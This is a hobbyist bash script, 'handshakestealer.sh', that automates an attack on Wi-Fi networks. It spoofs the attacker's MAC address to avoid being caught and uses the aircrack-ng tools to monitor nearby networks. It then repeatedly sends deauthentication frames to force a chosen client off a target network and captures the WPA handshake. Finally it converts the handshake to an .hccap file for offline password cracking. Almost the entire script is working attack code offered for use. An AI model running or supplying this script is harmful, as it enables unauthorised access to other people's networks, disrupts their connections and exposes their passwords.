#!/bin/bash

#### this script captures handshakes and cleans them 
#### to run this script first type "chmod +x handshakestealer.sh" then type "./handshakestealer.sh"
#### written by EMLGaming if you want to contact me my discord is: EMLGaming#6557

echo "made by:"
sleep 1
echo "-----------"
echo "|EMLGaming|"
echo "-----------"
sleep 1
echo "thanks for using my script if you have any bugs make sure to "
echo "pm them to me on discord"
echo "when you are ready to use the script PRESS ENTER"
echo "BUT make sure you have your wireless card plugged in"
read

clear

iwconfig

echo " "
echo "type the name of your wireless card, something like wlan0"
echo " "
read card
echo " "
echo "would you also like to spoof your mac adress? type yes or no"
read macspoof

if [[ $macspoof == 'yes' ]]; then
	echo "first we need to take your wireless card down"
	echo " "
	sleep 2
	ifconfig $card down
	echo "and now change the mac adress"
	echo " "	
	sleep 2
	macchanger -r $card
	echo "and back up again"
	echo " "	
	sleep 2
	ifconfig $card up
	echo "now you are annonymous"
	echo " "
	sleep 2
else 
	echo "if you wanna get caught well that is up to you"
	echo " "	
	sleep 4
fi

echo "and now it is time to put the card into monitor mode"
echo " "
sleep 2

airmon-ng start $card  
clear

echo "when you see your target press ctrl+c"
echo "press enter to continue"
read

xterm -hold -e "airodump-ng $card""mon" &

echo "I'm sorry but you HAVE to manually type this and can't copy past"
echo "if you know how to improve this make sure to pm me on discord"
echo "channel:"
read channel
echo "bssid:"
read bssid
echo "give a name for the .cap and .hccap file:"
read name
echo "when you see your specific target press ctrl+c"

gnome-terminal -x sh -c "airodump-ng -c $channel --bssid $bssid --write $name $card"mon"; bash" &

echo "the station is someone on the channel"
echo "there might not be someone on the channal so there might not show up a station"
echo "if that is the case or wait for someone to get on the network,"
echo "or re run the script and select another network"
echo "target station:"
read station

xterm -e "aireplay-ng --deauth 10 -a $bssid -c $station $card""mon" &

echo "now it is time to wait a bit"
sleep 20

entries=( "no"
          "yes" )

PS3='Selection: '

while [ "$menu" != 1 ]; do              
    printf "\nDo you have the handshake?:\n\n"           
    select choice in "${entries[@]}"; do  
        case "$choice" in            
            "no" )
                echo "well let's go back and deauth them more"
		xterm -e "aireplay-ng --deauth 10 -a $bssid -c $station $card""mon" &
		echo "now it is time to wait again"
		sleep 5
		echo "just bare with me it will take 5 more seconds"
		sleep 5

                break              
                ;;
            "yes" )         
                echo "good you have the handshake"
                menu=1                   
                break
                ;;
            * )
                echo "please type 1 or 2 not yes or no"
                break
                ;;
        esac
    done
done

echo "great lets go on"

aircrack-ng $name"-01".cap -J $name

mkdir -p /root/Desktop/handshakes

echo "we are now cleaning the capture file..."
sleep 2

cd ~
rm -f $name"-01".csv
rm -f $name"-01".kismet.csv
rm -f $name"-01".kismet.netxml
cp $name.hccap /root/Desktop/handshakes

echo "now it is time for the bruteforcing"
echo " "
sleep 2
echo "and do you want your wireless card out of monitor mode?"
read yesorno

if [[ $yesorno == 'yes' ]]; then
	echo "your wireless card is going out of monitor mode"
	echo " "	
	sleep 2
	airmon-ng stop $card"mon"
	echo "you are all good to go now"
	sleep 2
else
echo "oke then"
echo " "
sleep 2
fi

echo "the cleaned hccap file is on the desktop and now the cracking part begins"
echo " "
echo "this program is made by EMLGaming"		
echo "and thanks to bexian and killergeek for pointing out how stupid i am"
echo "thanks for using it and have a great day!"

# done!
